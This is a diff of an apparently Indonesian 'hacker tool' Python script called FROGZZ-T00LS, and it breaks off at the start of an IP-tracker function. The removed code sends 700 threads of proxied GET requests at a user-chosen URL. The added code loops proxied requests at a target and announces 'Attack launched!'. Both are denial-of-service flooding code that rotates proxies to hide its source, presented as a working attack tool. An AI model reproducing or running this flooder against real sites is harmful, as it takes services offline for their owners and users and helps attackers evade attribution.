@@ -1,36 +1,52 @@
-import requests, threading, time, random, sys
+import requests, threading, time, random
+from colorama import Fore, init
+init()
 
-proxies = []
+# Clear tampilan (biar kayak hacker manual)
 try:
-    proxy_list = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5).text.splitlines()
-    for proxy in proxy_list:
-        proxies.append({"http": f"http://{proxy}", "https": f"http://{proxy}"})
+    import os
+    os.system("clear")
 except:
-    proxies = [None]
+    pass
 
-def attack(url):
-    print("Sedang proses menyerang...")
-    def send():
+print(Fore.RED + "╔══════════════════════════════════════╗")
+print(Fore.RED + "║         F R O G Z Z  -  T 0 0 L S     ║")
+print(Fore.RED + "╚══════════════════════════════════════╝\n")
+
+# Input Target & Theders
+tgt = input(Fore.YELLOW + "Target (ex: http://example.com) >> ")
+thedz = int(input("Theders [MAX 2] >> "))
+
+# Batasi maksimal threads
+if thedz > 2:
+    thedz = 2
+
+# Load proxy dari file proxy.txt
+try:
+    with open("proxy.txt", "r") as f:
+        pxlist = f.read().splitlines()
+except:
+    print(Fore.RED + "[!] proxy.txt not found!")
+    exit()
+
+def atk():
+    while True:
+        px_ip = random.choice(pxlist)
+        proxy = {'http': f'http://{px_ip}', 'https': f'http://{px_ip}'}
         try:
-            proxy = random.choice(proxies)
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                "Accept": "*/*"
-            }
-            requests.get(url, headers=headers, proxies=proxy, timeout=3)
+            requests.get(tgt, proxies=proxy, timeout=5)
+            print(Fore.YELLOW + f"Proxy   > {px_ip}")
+            print(Fore.RED + f"Proces Sent > {tgt}\n")
+            time.sleep(0.5)
         except:
-            pass
+            continue
 
-    threads = []
-    for _ in range(700):
-        t = threading.Thread(target=send)
-        t.start()
-        threads.append(t)
+# Jalankan thread sesuai input
+for i in range(thedz):
+    threading.Thread(target=atk).start()
 
-    for t in threads:
-        t.join(timeout=10)
-
-    print("Selesai mengirim serangan.")
+# Tampil info selesai (tapi thread tetap jalan)
+print(Fore.GREEN + "\n[!] Attack launched! Press Ctrl+C to stop.\n")
 
 def ip_tracker():
     ip = input("Masukkan IP target: ")
